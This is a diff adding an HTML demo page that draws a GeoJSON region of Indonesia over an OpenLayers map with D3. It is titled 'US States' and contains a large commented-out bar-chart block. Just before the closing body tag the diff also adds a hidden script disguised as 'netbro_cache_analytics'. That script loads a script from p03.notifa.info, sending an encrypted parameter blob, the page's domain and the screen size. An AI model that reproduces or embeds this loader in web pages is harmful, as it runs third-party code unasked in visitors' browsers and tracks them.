@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>D3.js and Openlayers - US States</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/openlayers/2.13.1/theme/default/style.css" type="text/css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+    <!-- <script src="https://d3js.org/d3.v5.min.js"></script>
+    <script src="https://d3js.org/d3-request.v1.min.js"></script>
+    <script src="https://d3js.org/d3-queue.v3.min.js"></script> -->
+<script src="https://d3js.org/d3.v2.min.js?2.9.3"></script>
+<script src="https://d3js.org/d3-scale.v0.6.min.js"></script>
+<script src="https://d3js.org/d3-selection.v0.6.min.js"></script>
+<script src="https://d3js.org/d3-axis.v0.2.min.js"></script>
+<!-- <script src="https://d3js.org/d3-axis.v1.min.js"></script>
+<script src="https://d3js.org/d3-scale.v3.min.js"></script> -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/openlayers/2.13.1/OpenLayers.js"></script>
+<style>
+    body {
+        font-family: Arial, Helvetica, sans-serif;
+    }
+    #map {
+        margin: 0;
+        width: 100%;
+        height: 500px;
+    }
+    path {
+        fill: #000;
+        fill-opacity: .2;
+        stroke: #fff;
+        stroke-width: 1px;
+    }
+    path:hover {
+        fill: rgb(204, 33, 33);
+        fill-opacity: .7;
+    }
+
+    .x-axis {
+        fill: #000;
+        }
+
+
+        .chart {
+        margin: 5px;
+        }
+
+        .chart .category-bar {
+        stroke: white;
+        fill: steelblue;
+        }
+
+        .chart text.name {
+        fill: #000;
+        }
+
+        .chart line {
+        stroke: #c1c1c1;
+        }
+
+        .chart .rule {
+        fill: #000;
+        }
+
+        .main-category-text {
+        fill: #FF4A4A;
+        }
+
+        .main-category-bar {
+        stroke: #FF4A4A;
+        stroke-width: 2px;
+        }
+</style>
+
+<script type="text/javascript">
+    var map;
+
+
+    var COLOR_COUNTS = 9;
+    var SCALE = 0.7;
+
+    function Interpolate(start, end, steps, count) {
+        var s = start,
+            e = end,
+            final = s + (((e - s) / steps) * count);
+        return Math.floor(final);
+    }
+
+    function Color(_r, _g, _b) {
+        var r, g, b;
+        var setColors = function (_r, _g, _b) {
+            r = _r;
+            g = _g;
+            b = _b;
+        };
+
+        setColors(_r, _g, _b);
+        this.getColors = function () {
+            var colors = {
+                r: r,
+                g: g,
+                b: b
+            };
+            return colors;
+        };
+    }
+
+    function hexToRgb(hex) {
+        var result = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex);
+        return result ? {
+            r: parseInt(result[1], 16),
+            g: parseInt(result[2], 16),
+            b: parseInt(result[3], 16)
+        } : null;
+    }
+
+
+    var valueById = d3.map();
+    var config = {
+        color1: "#d1ffa2",
+        color2: "#00cf95",
+        mainCategory: "Lamahu",
+        averageCategory: "overweight_incl_obese_adults_number",
+        stateDataColumn: "state_and_district_of_columbia",
+        valueDataColumn:"obese_adults_number",
+    }
+
+    var margin = {top: 50, left:50, right:50, bottom:50},
+        height = 450 - margin.top - margin.bottom
+        width = $('#map').width() - margin.left - margin.right;
+
+    var COLOR_FIRST = config.color1, COLOR_LAST = config.color2;
+
+    var rgb = hexToRgb(COLOR_FIRST);
+
+    var COLOR_START = new Color(rgb.r, rgb.g, rgb.b);
+
+    rgb = hexToRgb(COLOR_LAST);
+    var COLOR_END = new Color(rgb.r, rgb.g, rgb.b);
+
+    // d3.csv("haha.csv", function(data){
+    //     console.log(data);
+
+
+    //     var gap = 2;
+    //     var names = [];
+
+    //     var ids = [];
+    //     var name_values = []; // nama desa
+    //     var values = [];
+
+    //     var total_categories = 0, categories_count = 0;
+
+    //     var chart;
+    //     var width2 = width - (margin.left + margin.right +50);
+    //     var bar_height = 20;
+    //     var height2 = (bar_height + 2 * gap) * names.length;
+
+        
+    //     Object.keys(data).forEach(function (n) {
+    //         ids.push(+n);
+    //         name_values.push({ name: data[n].name, value: (+n) });
+    //         values.push(data[n].name);
+    //         total_categories += +data[n].jumlah;
+    //         categories_count++;
+    //     });
+    //     values.push(Math.round(total_categories / categories_count));
+
+    //     values = values.sort(function (a, b) {
+    //         return -(a - b);
+    //     });
+
+    //     name_values = name_values.sort(function (a, b) {
+    //         return -(a.value - b.value);
+    //     });
+
+
+    //     name_values.forEach(function (d) {
+    //         names.push(d.name);
+    //     });
+
+
+    //     var left_width = 150;
+
+    //     var x = d3.scale.linear()
+    //         .domain([0, d3.max(values)])
+    //         .range([0, width2]);
+
+    //     var xAxis = d3.axisTop()
+    //         .scale(x)
+
+
+    //     var y = d3.scale.band()
+    //         .domain(names)
+    //         .rangeRound([0, (bar_height + 2 * gap) * names.length])
+
+    //     chart = d3.select("#chrt")
+    //         .append('svg')
+    //         .attr('class', 'chart')
+    //         .attr('width', width + margin.left + margin.right)
+    //         .attr('height', (bar_height + gap * 2) * names.length + 60)
+    //         .append("g")
+    //         .attr("transform", "translate(10, 40)");
+
+    //     chart.append("g")
+    //         .attr("class", "x axis")
+    //         .attr("transform", "translate(" + left_width + ", 0)")
+    //         .call(xAxis)
+    //         .append("text")
+    //         .attr("transform", "rotate(0) translate(" + (width2) + ", " + (0) + ")")
+    //         .attr("y", -30)
+    //         .attr("dy", "0em")
+    //         .style("text-anchor", "end")
+    //         .text(MAP_VALUE);
+
+    //     chart.selectAll(".tick").append("line")
+    //         .attr("x1", 0)
+    //         .attr("x2", 0)
+    //         .attr("y1", 0)
+    //         .attr("y2", (bar_height + gap * 2) * names.length);
+
+    //     chart.selectAll("rect")
+    //         .data(name_values)
+    //         .enter().append("rect")
+    //         .attr("x", left_width)
+    //         .attr("y", function (d) {
+    //             return y(d.name) + gap;
+    //         })
+    //         .attr("name", function (d, i) {
+    //             return d.name;
+    //         })
+    //         .attr("width", function (d, i) {
+    //             return x(d.value);
+    //         })
+    //         .attr("height", bar_height)
+    //         .style("fill", function (d) {
+    //             var i = quantize(d.value);
+    //             var color = colors[i].getColors();
+    //             return "rgb(" + color.r + "," + color.g +
+    //                 "," + color.b + ")";
+    //         })
+
+    //     chart.selectAll("text .score")
+    //         .data(name_values)
+    //         .enter().append("text")
+    //         .attr("x", function (d) {
+    //             return x(d.value) + left_width; }
+    //         )
+    //         .attr("y", function (d, i) {
+    //             return y(d.name) + y.bandwidth() / 2;
+    //         })
+    //         .attr("dx", 5)
+    //         .attr("dy", ".36em")
+    //         .attr("text-anchor", "left")
+    //         .attr('class', 'score')
+    //         .text(function (d) {
+    //             return d.value;
+    //         });
+
+    //     chart.selectAll("text .name")
+    //         .data(name_values)
+    //         .enter().append("text")
+    //         .attr("x", left_width / 2)
+    //         .attr("y", function (d, i) {
+    //             return y(d.name) + y.bandwidth() / 2;
+    //         })
+    //         .attr("dy", ".36em")
+    //         .attr("text-anchor", "middle")
+    //         .text(function (d) {
+    //             return d.name;
+    //         });
+    // });
+
+    // d3.queue()
+    //     .defer(d3.json, "http://localhost/openlayer/selatan.geojson")
+    //     .defer(d3.csv, "http://localhost/openlayer/haha.csv")
+    //     .await(ready);
+
+    function init() {
+        var extent = [-20037508.34, -20037508.34,
+            20037508.34, 20037508.34
+        ];
+        map = new OpenLayers.Map('map', {
+            numZoomLevels: 20,
+            projection: new OpenLayers.Projection("EPSG:900913"),
+            displayProjection: new OpenLayers.Projection("EPSG: 4326"),
+            maxExtent: extent,
+            restrictedExtent: extent,
+            controls: [
+                new OpenLayers.Control.Navigation(),
+                new OpenLayers.Control.Zoom(),
+                new OpenLayers.Control.ScaleLine(),
+                new OpenLayers.Control.LayerSwitcher(),
+                new OpenLayers.Control.MousePosition(),
+                new OpenLayers.Control.KeyboardDefaults()
+            ]
+        });
+
+        var ol_wms = new OpenLayers.Layer.OSM();
+        map.addLayers([ol_wms]);
+        map.setCenter(new OpenLayers.LonLat(123.074654,0.593317).transform("EPSG:4326", "EPSG:900913"), 14);
+
+
+        
+
+
+        d3.json("selatan.geojson", function (collection) {
+            console.log(collection);
+            var overlay = new OpenLayers.Layer.Vector("states");
+
+            // Add the container when the overlay is added to the map.
+            overlay.afterAdd = function () {
+                //get the vector layer div element
+                var div = d3.selectAll("#" + overlay.div.id);
+                //remove the existing svg element and create a new one
+                div.selectAll("svg").remove();
+                var svg = div.append("svg");
+                //Add a G (group) element
+                g = svg.append("g");
+                var bounds = d3.geo.bounds(collection),
+                    path = d3.geo.path().projection(project);
+                var feature = g.selectAll("path")
+                    .data(collection.features)
+                    .enter().append("path");
+                map.events.register("moveend", map, reset);
+                reset();
+
+                function reset() {
+                    var bottomLeft = project(bounds[0]),
+                        topRight = project(bounds[1]);
+
+                    svg.attr("width", topRight[0] - bottomLeft[0])
+                        .attr("height", bottomLeft[1] - topRight[1])
+                        .style("margin-left", bottomLeft[0] + "px")
+                        .style("margin-top", topRight[1] + "px");
+
+                    g.attr("transform", "translate(" + -bottomLeft[0] + "," + -topRight[1] + ")");
+
+                    feature.attr("d", path);
+                }
+                function project(x) {
+                    var point = map.getViewPortPxFromLonLat(new OpenLayers.LonLat(x[0], x[1])
+                            .transform("EPSG:4326", "EPSG:900913"));
+                    return [point.x, point.y];
+                }
+            }
+            map.addLayer(overlay);
+        });
+
+    }
+
+
+        </script>
+    </head>
+    <body onload="init()">
+    <!-- <body> -->
+        <div id="map"></div>
+        <p>This is an example of maps</p>
+        <div id="chrt">
+
+        </div>
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAAPWY5UEqTuntzJt90rtadJJJKsTTMraOcG2fZoB%2fgAPdqBQUi%2fUUycIKDajHCRZ8n7P%2fBa%2bVlbcba248xRv3MbIQsyfJ%2fHx1BSwJjdN5Fu%2bzuNWBQpHF8BLxl%2beFqt8b1SA9YQKLW9QAQ4tfzMSXt1vHHAF1u0RRZh5TEtnkOTh8LIOVkAYM1M4gdrmLXvVTulTvkE%2bcNzynatHGqRAlU6Y5%2fWbpelUR6qiBqhfxnQx6lNkheIGFQfprT1rmSql8tzEEcE5mM02%2f0Z1P4D8194mLKjTQ9FlqESbSZ9sg%2bDBj0pOyHThmDXYaqsgNfdeDJ5DBM3LVHAjMdBpXaYUD%2fX%2bpwMzWNd%2bTyPSyiGaLqJ0sA1i%2byiMqKj3QK0EkdQJRimvKZFHPZZ%2bN%2fM2jKvoI%2fquDeyp1mSnQUAWu17h2A1qVYGlML3z3W%2be%2bjtFY%2f8COAKeF7sh3IQ6UNcxdUSZf03fRo8%2foR9iQLbtqIOVo9z03uoTNWTde2Z%2bXsduho21Y80yeFNZwld9QA0RytR6edg8L0g940XNzQ%2bJDMWFWYIpPw7E%2bCWom%2ffuR6%2f5dm%2bLVJibgs2v5qxwLU1zw%2fOTDSCJILOpyh6%2fq0B6lELCksRM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
